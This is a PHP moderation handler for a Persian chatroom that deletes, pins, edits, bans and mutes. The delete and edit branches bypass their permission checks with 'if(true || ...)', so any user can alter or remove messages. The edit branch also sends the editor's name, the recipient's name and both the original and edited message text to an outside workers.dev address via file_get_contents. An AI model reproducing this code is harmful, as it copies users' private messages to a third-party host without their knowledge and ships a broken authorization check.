<?php
check_session();
$action = isset($_POST['action']) ? safe::string($_POST['action']) : "";
$useroptions = json_decode($options['msgoptions'], true);
if($action == "DelMsg"){
  if($options['deletetext']=='true'){
	if(true || in_array(session('type'), $useroptions['allowdelmsg'])){
	$idmsg = safe::string($_POST['msgid']);
	$data = array('action'=>'delete','msgid'=>$idmsg);
	$text = json_encode($data, JSON_UNESCAPED_UNICODE);
      $user = $sql->where('id',$idmsg)->getOne('message','username');
      $sql->insert('message',array(
      'user' => -1,
      'username' => $systemname,
      'color' => $systemcolor,
      'room' => -1,
      'text' => $text,
      'date' => $_SERVER['REQUEST_TIME'],
      'to' => -1,
      'into' => 'deletmsg',
      'type' => 0
));
    echo('ok');
	}
	else
	{
	echo('برای گروه کاربری شما محدودیت قرار داده شده است');
	}
   }
	else
	{
	echo("این سیستم غیر فعال میباشد");
	}
}
if($action == "PinMsg"){
	if(in_array(session('type'), isset($useroptions['allowpinmsg']) ? $useroptions['allowpinmsg'] : array())){
		$idmsg = safe::number($_POST['msgid']);
		if($idmsg <= 0){ echo('msgid'); return; }
		// پیام از جدول اصلی یا بایگانی (پیام‌های خارج از پنجره‌ی اخیر فقط در archive هستند)
		$row = $sql->where('id',$idmsg)->getOne('message', array('username','text'));
		if(!$row){
			$row = $sql->where('id',$idmsg)->getOne('message_archive', array('username','text'));
		}
		if($row){
			// اگر پیام از نوع reply/forward باشد، متنِ نمایشی (mymsg) را استخراج کن تا JSON در بنر ظاهر نشود.
			$pintext = $row['text'];
			$jtxt = str_replace(array('<b>', '</b>', '<i>', '</i>'), "", $pintext);
			if (isJson($jtxt)) {
				$jd = json_decode($jtxt, true);
				if (isset($jd['action']) && $jd['action'] == 'reply' && isset($jd['mymsg'])) {
					$pintext = $jd['mymsg'];
				}
			}
			// فقط یک پینِ فعال در لحظه؛ پینِ جدید جایگزین پینِ قبلی می‌شود.
			$sql->where('active', 1)->update('pinned', array('active' => 0));
			$sql->insert('pinned', array(
				'user_id' => session('id'),
				'username' => $row['username'],
				'name' => session('name'),
				'message' => $pintext,
				'time' => $_SERVER['REQUEST_TIME'],
				'active' => 1
			));
			$data = array('action'=>'pinmsg','msgid'=>$idmsg);
			$text = json_encode($data, JSON_UNESCAPED_UNICODE);
			$sql->insert('message',array(
				'user' => -1,
				'username' => $systemname,
				'color' => $systemcolor,
				'room' => -1,
				'text' => $text,
				'date' => $_SERVER['REQUEST_TIME'],
				'to' => -1,
				'into' => 'pinmsg',
				'type' => 0
			));
			echo('ok');
		}else{
			echo('پیام وجود ندارد');
		}
	}
	else
	{
		echo('برای گروه کاربری شما محدودیت قرار داده شده است');
	}
}
if($action == "UnPinMsg"){
	if(in_array(session('type'), isset($useroptions['allowpinmsg']) ? $useroptions['allowpinmsg'] : array())){
		$sql->where('active', 1)->update('pinned', array('active' => 0));
		$data = array('action'=>'unpinmsg','msgid'=>0);
		$text = json_encode($data, JSON_UNESCAPED_UNICODE);
		$sql->insert('message',array(
			'user' => -1,
			'username' => $systemname,
			'color' => $systemcolor,
			'room' => -1,
			'text' => $text,
			'date' => $_SERVER['REQUEST_TIME'],
			'to' => -1,
			'into' => 'unpinmsg',
			'type' => 0
		));
		echo('ok');
	}
	else
	{
		echo('برای گروه کاربری شما محدودیت قرار داده شده است');
	}
}
if($action == "EidtMsg"){
   if($options['edittext']=='true'){
    if(true || in_array(session('type'), $useroptions['alloweditmsg'])){
	$idmsg = safe::number($_POST['id']);
	$msg = safe::string($_POST['msg']);
	$act = safe::string($_POST['act']);
	$time = date('H:i', time());
	$data = array("action"=>"editonemsg","msgid"=>$idmsg,"message"=>$msg,"act"=>$act);
	$text = json_encode($data, JSON_UNESCAPED_UNICODE);
      $user = $sql->where('id',$idmsg)->getOne('message','username'); 
      //-----------edite loger--------
       $before = $sql->where('id', $idmsg)->getOne('message', 'text');
	  $beforeto = $sql->where('id', $idmsg)->getOne('message', 'to');
      $beforeto = $beforeto['to'];
      $input_p=   $sql->where('id', $beforeto)->getOne('users'); $input=$input_p["name"]; $beforeto = $input;
	   $before_text = $before['text']; $meme = session('name');
       $allrep= "پیام ادیت شده  توسط  ".$meme."\nبا آی دی : ".$idmsg."\nبه کاربر : ".$beforeto."\n\nپیام اولیه : ".$before_text."\n\nادیت شده : ".$msg;
	   $data_to_send = urlencode($allrep); 
	   file_get_contents("https://oflinemessage.mohammadelyasi21.workers.dev/?text=".$data_to_send);
      //------------------------------
      $sql->insert('message',array(
      'user' => -1,
      'username' => $systemname,
      'color' => $systemcolor,
      'room' => -1,
      'text' => $text,
      'date' => $_SERVER['REQUEST_TIME'],
      'to' => -1,
      'into' => 'editonemsg',
      'type' => 0
));
	$user = $sql->where('id',$idmsg)->update('message',array(
   'text' => $msg
	));
    echo('ok');
	}
	else
	{
	echo('برای گروه کاربری شما محدودیت قرار داده شده است');
	}
   }
	else
	{
	echo("این سیستم غیر فعال میباشد");
	}
}
if($action == "BennUser"){
	$admin = session('admin');
	$vip_user_is_admin = false;
   $type = $sql->where('id',safe::number($_POST['user']))->getOne('onlines','type');
	if(Users::is_admin($type['type'])){
		if(in_array($type['type'],array('1','2','3'))){
			exit("شما نمیتوانید این کاربر را اخراج کنید");return;
		}
		
	}
    $sql->where("id", safe::number($_POST['user']));
    $get_room_id = $sql->getValue('onlines', 'roomid');
    $sql->where("id", $get_room_id['roomid']);
    $me_room = $sql->getOne("rooms", 'vip_user');
    $json = json_decode($me_room['vip_user'], true);
if($json['vip_user'] == session('id')){$vip_user_is_admin = true;}
  if($admin != '0' or $vip_user_is_admin){
    $protect = true;
    $checkdec = json_decode($options['mod_protect'], true);
if($checkdec['status'] == '1'){
	if(!isset($_POST['password'])) exit('pw');
	if($checkdec['pw'] != $_POST['password']){
		$protect = false;
		exit('کلمه عبور اشتباه است');
	}else{
		$protect = true;
	}
}
if(isset($_POST['user']) && $protect && $admin != '0'){
	    $msgid = safe::string($_POST['msgid']);
        $user = safe::string($_POST['user']);
	$name = $sql->where('id',$user)->getOne('users',array('username', 'type'));
        if(Users::CheckId($user)){
	Access2Manage($user, 'admin');
	// دسکتاپ دقّتِ مشخص نمی‌دهد → از مقدارِ پیش‌فرض (bann_defualttime) استفاده کن.
	// موبایلِ /phone می‌تواند «time» (دقیقه) اختیاری بفرستد تا مدتِ اخراج را برگزیند.
	$bann_mins = isset($_POST['time']) && is_numeric($_POST['time']) ? (int) $_POST['time'] : (int) $options['bann_defualttime'];
	if ($bann_mins <= 0) $bann_mins = (int) $options['bann_defualttime'];
        $time = time() + ($bann_mins * 60);
	$reason = isset($_POST['reason']) ? safe::string($_POST['reason']) : die('دلیل اخراج را وارد کنید');
        Users::bann($user, $time, $reason);
        stats('bann');
	$msg = array('action' => 'delete', 'msgid' => $msgid);
        $text = json_encode($msg, JSON_UNESCAPED_UNICODE);
        $sql->insert('message',array(
      'user' => -1,
      'username' => $systemname,
      'color' => $systemcolor,
      'fontname' => $defualtfontname,
      'fontsize' => $defualtfontsize,
      'room' => -1,
      'text' => $text,
      'date' => $_SERVER['REQUEST_TIME'],
      'to' => -1,
      'into' => 'deletmsg',
      'type' => 0
));
            chatroom::addlog('7', " اخراج و پاک کردن تمامی پیام های کاربر \"{$name['username']}\" از عمومی");
            echo('ok');
            unset($date, $type);
        }else{
            echo('user');
        }
        unset($user);
		unset($admin);
    }
}
	
}
if($action == "SilentUser"){
	$admin = session('admin');
if(safe::number($_POST['user']) == session('id'))return;
   $type = $sql->where('id',safe::number($_POST['user']))->getOne('onlines','type');
if(Users::is_admin($type['type'])){
		if(in_array($type['type'],array('1','2','3'))){
			exit("شما نمیتوانید این کاربر را خفه کنید");return;
		}
		
	}
$vip_user_is_admin = false;
$sql->where("id", safe::number($_POST['user']));
$get_room_id = $sql->getValue('onlines', 'roomid');
$sql->where("id", $get_room_id['roomid']);
$me_room = $sql->getOne("rooms", 'vip_user');
$json = json_decode($me_room['vip_user'], true);
if($json['vip_user'] == session('id')){$vip_user_is_admin = true;}
if($admin != '0' or $vip_user_is_admin){
    if(isset($_POST['user'])){
	    $msgid = safe::string($_POST['msgid']);
        $user = safe::number($_POST['user']);
		
				      $name = $sql->where('id',$user)->getOne('users','username');
                $time = safe::number($_POST['time']);
		if(!is_numeric($time)) exit('no number');
		if(safe::number($time) == 0){
			$sql->where('users',$user);
			$sql->orderBy('id','DESC');
			$ss = $sql->getOne('silents');
			$sql->where('ip',$ss['ip']);
			$qq = $sql->get('onlines', null, array('inputs','id','name'));
			foreach($qq as $rr){
				$val['inputs'] = json_decode($rr['inputs'], true);
				$val['inputs']['simg'] = '';
				$val['inputs']['stext'] = '';
				$val['inputs']['avatar'] = $val['inputs']['avatar'];
				$val['inputs']['silent'] = 0;
				Users::Inputs($rr['id'], $val['inputs']);
				$_username = $rr['name'];
				chatroom::addlog('5', "کاربر \"{$_username}\" از لیست ساکت شدگان خارج کرد");
			}
			$sql->where('users',$user)->orWhere('ip',$ss['ip'])->delete('silents');
						exit('کاربر با موفقیت از لیست ساکت شدگان خارج شد');
		}
		Access2Manage($user);
		$sql->where('users',$user);
		if($sql->has('silents')) exit('repeat');
		if(empty($time)) exit('زمانی برای خفه کردن کاربر وارد نشده است');
		$time = safe::number($time);
		$time = ($time * 60) + time();
		$sec  = $time * 60;
		$where = safe::number($_POST['where']);
        	if($user = $sql->where('id',$user)->getOne('onlines',array('id','type','ip','inputs'))) {
            if(!CheckAdminType($user['type'])){echo('admin');return;}
            $users = array();
            $query = $sql->where('id',$user['id'])->get('onlines', null, array('id','inputs','name'));
           	foreach($query as $row) {
                $row['inputs'] = json_decode($row['inputs'], true);
                $row['inputs']['silent'] = $where;
				$row['inputs']['simg'] = 'status_silent';
				$row['inputs']['avatar'] = $row['inputs']['avatar'];
			    $row['inputs']['stext'] = $sec;
			    $row['inputs']['alert'] = "شما توسط یکی از ناظرین یا معاونین ساکت شدید";
                Users::Inputs($row['id'], $row['inputs']);
                chatroom::addlog('5', "خفه کردن کاربر \"{$row['name']}\" به مدت  ".safe::number($_POST['time'])." دقیقه");
                $users[] = $row['id'];
            }
            $users = implode(',', $users);
	$sql->insert('silents',array(
      'ip' => $user['ip'],
      'muter' => session('id'),
      'time' => $time,
      'users' => $users,
      'where' => 2,
));
			$msg = array('action' => 'delete', 'msgid' => $msgid);
            $text = json_encode($msg, JSON_UNESCAPED_UNICODE);
                $sql->insert('message',array(
      'user' => -1,
      'username' => $systemname,
      'color' => $systemcolor,
      'fontname' => $defualtfontname,
      'fontsize' => $defualtfontsize,
      'room' => -1,
      'text' => $text,
      'date' => $_SERVER['REQUEST_TIME'],
      'to' => -1,
      'into' => 'deletmsg',
      'type' => 0
));
            chatroom::addlog('7', " ساکت کردن و پاک کردن تمامی پیام های کاربر \"{$name['username']}\" از عمومی");
            echo('ok');
            unset($date, $type);
        }else{
            echo('user');
        }
        unset($user);
    }
}else{
    echo('permision');
    }
	unset($admin);
}
?>